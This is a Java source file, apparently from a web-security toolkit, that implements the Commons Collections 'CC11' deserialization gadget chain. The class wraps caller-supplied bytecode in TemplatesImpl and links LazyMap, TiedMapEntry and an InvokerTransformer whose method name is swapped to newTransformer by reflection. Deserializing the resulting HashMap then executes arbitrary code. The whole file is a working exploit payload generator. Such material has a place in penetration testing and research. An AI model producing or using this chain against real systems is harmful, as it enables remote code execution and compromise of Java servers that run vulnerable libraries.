package com.reajason.javaweb.deserialize.payload.java;

import com.reajason.javaweb.deserialize.Payload;
import com.reajason.javaweb.deserialize.TemplateUtils;
import com.reajason.javaweb.deserialize.utils.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import lombok.SneakyThrows;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

/**
 * CC11 链 from <a href="https://github.com/dota-st/JavaSec/blob/master/03-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E5%8C%BA/9-CommonsCollections11/CommonsCollections11.md">CommonsCollections11.md</a>
 *
 * @author ReaJason
 * @since 2025/4/2
 */
public class CommonCollections3 implements Payload {

    @Override
    @SneakyThrows
    @SuppressWarnings({"rawtypes", "unchecked"})
    public Object generate(byte[] bytes) {
        TemplatesImpl templates = TemplateUtils.createTemplatesImpl(bytes);

        InvokerTransformer invokerTransformer = new InvokerTransformer("toString", null, null);

        Map innerMap = new HashMap<>();
        Map outerMap = LazyMap.decorate(innerMap, invokerTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, templates);

        Map expMap = new HashMap<>();
        expMap.put(tiedMapEntry, "valueTest");
        outerMap.remove(templates);

        Reflections.setFieldValue(invokerTransformer, "iMethodName", "newTransformer");
        return expMap;
    }
}
